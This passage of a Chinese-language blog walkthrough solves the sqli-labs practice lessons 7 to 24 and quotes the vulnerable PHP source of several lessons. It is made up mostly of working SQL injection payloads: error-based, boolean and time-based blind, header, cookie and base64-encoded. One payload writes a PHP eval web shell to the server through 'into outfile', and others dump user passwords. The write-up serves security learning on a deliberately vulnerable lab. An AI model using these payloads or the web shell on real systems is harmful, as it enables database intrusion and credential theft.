count(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure><p>回显正常，说明不是权限不够的问题；</p><h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>猜想：可能是需要在指定的目录下进行数据的导出操作，<code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，先查看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/08/kzznaj.png" alt="kzznaj.png"></p><p>结果为NULL， </p><blockquote><p>1.如果这个参数为空，这个变量没有效果；<br>2.如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>3.如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作；</p></blockquote><p>在MYSQL配置文件my.ini添加<code>secure_file_priv=</code>，再次查看得到结果不为NULL，因为没有设置指定的目录，所以任意目录都可以进行导入和导出；</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="1-写入木马"><a href="#1-写入木马" class="headerlink" title="1.写入木马"></a>1.写入木马</h4><p>直接使用outfile的写文件功能向指定文件夹上传木马，连接菜刀即可；</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><h4 id="2-导出文件"><a href="#2-导出文件" class="headerlink" title="2. 导出文件"></a>2. 导出文件</h4><p>直接将users表单内容导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;)) union select * from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\sqli-labs-master\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure><h2 id="less-8-bool盲注"><a href="#less-8-bool盲注" class="headerlink" title="less-8(bool盲注)"></a>less-8(bool盲注)</h2><p>其实和第5关相比就是注释掉了<code>print_r(mysql_error())</code>，是个bool盲注，只是不可以使用报错注入而已；</p><p><img src="https://s2.ax1x.com/2019/03/12/AiG7o6.png" alt="AiG7o6.png"></p><p>所以直接构造逻辑判断盲注即可：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%20and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><h2 id="less-9-时间盲注-单引号"><a href="#less-9-时间盲注-单引号" class="headerlink" title="less-9(时间盲注-单引号)"></a>less-9(时间盲注-单引号)</h2><p>这一关和前面的第8关的区别就是没有回显，是一个时间盲注，直接闭合引号后时间盲注即可；</p><p>payload:</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((database()),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>其实就是一个暴力破解的过程(二分法提高效率)</p><h2 id="less-10-时间盲注-双引号"><a href="#less-10-时间盲注-双引号" class="headerlink" title="less-10(时间盲注-双引号)"></a>less-10(时间盲注-双引号)</h2><p>测试单引号<code>?id=1&#39; and sleep(5)--+</code>没有延时，说明不是单引号，试一下双引号即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure><p>接下来除了双引号，和less-9一样；</p><h2 id="less-11-Post注入"><a href="#less-11-Post注入" class="headerlink" title="less-11(Post注入)"></a>less-11(Post注入)</h2><p>无从下手就查看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>这里的uname和passwd都是通过post请求传入的，这里我们需要使用到bp截包修改传递参数的内容；首先闭合引号后，构造永真语句查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb</p></blockquote><p>成功回显，所以直接就可以查询列数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; order by 2--+</span><br></pre></td></tr></table></figure><p>发现是有两列的，然后继续构造union select查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select 1,2--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFR0JO.png" alt="AFR0JO.png"></p><p>发现可以查询到1,2列的东西，那就可以利用这两个位置来回显想要的东西了；构造如下语句：</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),version()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFRRTP.png" alt="AFRRTP.png"></p><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWl7t.png" alt="AFWl7t.png"></p><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWUXj.png" alt="AFWUXj.png"></p><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWgc4.png" alt="AFWgc4.png"></p><p>其实无非就是传参方式变了而已，友情提示：新版hackbar是坑，谨慎使用；</p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>其实和上一题类似，只是闭合方式变了而已，需要用到双引号加小括号闭合，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试单引号失败，双引号失败，发现应该没有那么简单，直接查看源码发现如下内容：</p><p>1.闭合方式是<code>&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>2.不会返回SQL查询语句的内容</p><p><img src="https://s2.ax1x.com/2019/03/13/AFfqiV.png" alt="AFfqiV.png"></p><p>3.发现针对查询结果对错的返回页面的图片不一样</p><p>正确：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>这里演示2种方法：</p><h3 id="solution1-concat报错"><a href="#solution1-concat报错" class="headerlink" title="solution1(concat报错)"></a>solution1(concat报错)</h3><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><h3 id="solution2-逻辑判断"><a href="#solution2-逻辑判断" class="headerlink" title="solution2(逻辑判断)"></a>solution2(逻辑判断)</h3><p>思路：首先我们post一个错误的uname和passwd过去，然后构造or语句后面跟上查询语句，这样的话第一句话为flase，如果第二个查询也为flase，则会回显错误图片slap.jpg，否则回显正确图片flag.jpg</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</span><br></pre></td></tr></table></figure><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>除了闭合方式为双引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式为单引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式为双引号加括号：<code>&quot;)</code>，其余和less-13一致；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>这是在用uname查询之前经过的check_input()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br><strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br><strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p></blockquote><p>这只说明一个问题，注入点不在uname，在passwd，查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">mysql_query($update);</span><br></pre></td></tr></table></figure><p>直接报错注入即可</p><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆数据出现问题：</p><blockquote><p>You can’t specify target table ‘users’ for update in FROM clause</p><p>应该是不能对同一个表同时进行update和select</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>所以需要构造子查询去得到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select username from (select username from users) as a limit 1,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>注到这里，回去学习一下username的过滤函数：</p><blockquote><p>1.<code>get_magic_quotes_gpc()</code>函数取得PHP环境配置的变量<code>magic_quotes_gpc(GPC, Get/Post/Cookie)</code>值。返回<code>0</code>表示本功能关闭，返回<code>1</code>表示本功能打开。当<code>magic_quotes_gpc</code>打开时，所有的<code>&#39;(单引号)</code>、<code>&quot;(双引号)</code>、<code>\(反斜杠)</code>和<code>NULL(空字符)</code>会自动转为含有反斜杠的溢出字符;</p><p>2.<code>stripslashes(string)</code>函数删除由<code>addslashes()</code>函数添加的反斜杠;</p><p>3.<code>ctype_digit(string)</code>函数检查字符串中每个字符是否都是十进制数字，若是则返回<code>TRUE</code>，否则返回<code>FALSE</code>;</p><p>4.<code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;\x00</span><br><span class="line">&gt;\n</span><br><span class="line">&gt;\r</span><br><span class="line">&gt;\</span><br><span class="line">&gt;&apos;</span><br><span class="line">&gt;&quot;</span><br><span class="line">&gt;\x1a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>进来就显示IP，猜测是http头注入，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现对uname和passwd都做了过滤，不存在注入点，继续向上面看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];<span class="comment">//是服务端根据请求TCP包的ip指定的</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your IP ADDRESS is: '</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>所以此时想到修改XFF头看看回显，然而并没有什么luan用，看到上面的UA头，查看到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p><strong>先成功登陆一下！！！！！！！</strong>输入<code>1&#39;</code>发现UA确实是存在注入点</p><p><img src="https://s2.ax1x.com/2019/04/23/EEBx0g.png" alt="EEBx0g.png"></p><p>存在注入点，使用updatexml注入：</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EE0PEj.png" alt="EE0PEj.png"></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>先登陆：</p><p><img src="https://s2.ax1x.com/2019/04/23/EEDnAJ.png" alt="EEDnAJ.png"></p><p>应该和上一题类似，只不过改成了referer头而已，测试<code>1&#39;</code>报错:</p><p><img src="https://s2.ax1x.com/2019/04/23/EEDL59.png" alt="EEDL59.png"></p><p>这就很简单了，直接报错注入：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EErF5d.png" alt="EErF5d.png"></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>登陆：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErnr8.png" alt="EErnr8.png"></p><p>发现提示为Cookie，想到Cookie注入，测试<code>uname=1&#39;</code>报错：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErdZF.png" alt="EErdZF.png"></p><p>尝试报错注入：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErrGR.png" alt="EErrGR.png"></p><p><img src="https://s2.ax1x.com/2019/04/23/EErbsf.png" alt="EErbsf.png"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>登入：</p><p><img src="https://s2.ax1x.com/2019/04/23/EEspzq.png" alt="EEspzq.png"></p><p>发现一串base64编码，解一下发现为Dumb为用户名，说明可能是让我们base64编码以后再传入数据：</p><p>尝试<code>1&#39;</code>报错，再尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>继续报错，base64一下再发包：报错注入成功</p><p><img src="https://s2.ax1x.com/2019/04/23/EEscfs.png" alt="EEscfs.png"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MScgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkgYW5kICcxJz0nMQ==</span><br></pre></td></tr></table></figure><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和上一关没有什么区别，就是换了双引号而已，</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkgYW5kICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EEyVnf.png" alt="EEyVnf.png"></p><h2 id="less-23-报错注入-过滤注释"><a href="#less-23-报错注入-过滤注释" class="headerlink" title="less-23(报错注入+过滤注释)"></a>less-23(报错注入+过滤注释)</h2><p>拿到手先试一下单引号，报错，以为很简单，但是想到已经是进阶版的注入，在尝试了注释掉后面内容以后发现一直在报错，果然没那么简单……在尝试完所有的注释符号后我发现……可能是过滤掉了注释符号……</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>成功闭合，所以下面就是常规操作…</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>查看源码：</p><p>过滤函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>有print出来error，所以允许报错注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less-24(二次注入)"></a>less-24(二次注入)</h2><p>上来是个登录界面，有注册和修改密码功能，先注册一个新账号，登录后发现<code>YOU ARE LOGGED IN</code>字样，第一次登陆还需要修改密码；此题的目的应该是冒充admin用户登录。</p><p>三个核心功能：登录，注册，修改密码，一个个看；</p><p><img src="https://s2.ax1x.com/2019/05/29/Vu0n3t.png" alt="Vu0n3t.png"></p><p>退出登录寻找注入点，这里的目的应该是要用admin用户的身份登录；在登录界面随手尝试；尝试万能密码 <code>admin&#39; or &#39;1&#39;=&#39;1</code>发现不可以，那应该就是过滤了其中的一些字符集，注入点应该不在这个页面；最后发现是一个二次注入的题目；</p><h3 id="为什么在主页不能实现直接注入？"><a href="#为什么在主页不能实现直接注入？" class="headerlink" title="为什么在主页不能实现直接注入？"></a>为什么在主页不能实现直接注入？</h3><p>在<strong>login.php</strong>中对输入的参数进行了特殊字符转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span 